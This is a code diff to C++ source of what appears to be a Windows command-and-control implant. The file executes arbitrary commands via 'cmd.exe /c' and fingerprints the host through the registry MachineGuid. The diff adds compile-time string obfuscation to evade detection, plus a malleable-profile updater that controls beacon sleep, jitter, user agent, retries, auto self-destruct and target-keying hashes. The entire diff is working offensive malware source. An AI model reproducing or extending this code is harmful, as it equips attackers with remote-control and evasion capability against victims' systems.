@@ -1,9 +1,13 @@
 #include <Lmcons.h>
 #include "command.h"
 #include "debug.h"
+#include "profile.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 #include "rapidjson/stringbuffer.h"
+#include "obfuscator/MetaString.h"
+using namespace andrivet::ADVobfuscator;
+
 
 LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut) {
     // szCmdLine should fit in cmd.exe /c <szCmdLine>
@@ -36,7 +40,7 @@ LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut) {
     // Set up full command line
     // cmd.exe /c <szCmdLine>
     char fullCmdLine[4096];
-    strcpy(fullCmdLine, "cmd.exe /c ");
+    strcpy(fullCmdLine, OBFUSCATED("cmd.exe /c "));
     strcat(fullCmdLine, szCmdline);
 
     if (!CreateProcess(NULL, (LPSTR)fullCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
@@ -135,9 +139,9 @@ std::string SysInfo()
     HKEY hKey;
     char guid[256];
     DWORD guidSize = sizeof(guid);
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
     {
-        RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)&guid, &guidSize);
+        RegQueryValueEx(hKey, OBFUSCATED("MachineGuid"), NULL, NULL, (LPBYTE)&guid, &guidSize);
         RegCloseKey(hKey);
     }
 
@@ -166,4 +170,50 @@ std::string SysInfo()
 
     return buffer.GetString();
 
+}
+
+
+void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) {
+    rapidjson::Value::ConstMemberIterator itr = changes->MemberBegin();
+    for (; itr != changes->MemberEnd(); ++itr) {
+        if (itr->name == OBFUSCATED("sleep_time")) {
+            currentProfile->sleep = itr->value.GetInt();
+        }
+        else if (itr->name == OBFUSCATED("user_agent")) {
+            currentProfile->userAgent = itr->value.GetString();
+        }
+        else if (itr->name == OBFUSCATED("jitter")) {
+            currentProfile->jitter = itr->value.GetFloat();
+        }
+        else if (itr->name == OBFUSCATED("max_retries")) {
+            currentProfile->maxRetries = itr->value.GetInt();
+        }
+        else if (itr->name == OBFUSCATED("auto_self_destruct")) {
+            currentProfile->autoSelfDestruct = itr->value.GetBool();
+        }
+        else if (itr->name == OBFUSCATED("retry_wait")) {
+            currentProfile->retryWait = itr->value.GetInt();
+        }
+        else if (itr->name == OBFUSCATED("retry_jitter")) {
+            currentProfile->retryJitter = itr->value.GetFloat();
+        }
+        else if (itr->name == OBFUSCATED("tailoring_hashes")) {
+            currentProfile->tailoringHashes = std::vector<std::string>();
+            for (auto& hash : itr->value.GetArray()) {
+                currentProfile->tailoringHashes.push_back(hash.GetString());
+            }
+        }
+        else if (itr->name == OBFUSCATED("tailoring_hash_function")) {
+            std::string hashFunction = itr->value.GetString();
+            if (!(hashFunction == OBFUSCATED("sha256") || hashFunction == OBFUSCATED("md5"))) {
+                DEBUG_PRINTF("Invalid hash function: %s\n", hashFunction.c_str());
+            }
+            else {
+                currentProfile->tailoringHashFunction = hashFunction;
+            }
+        }
+        else if (itr->name == OBFUSCATED("tailoring_hash_rounds")) {
+            currentProfile->tailoringHashRounds = itr->value.GetInt();
+        }
+    }
 }
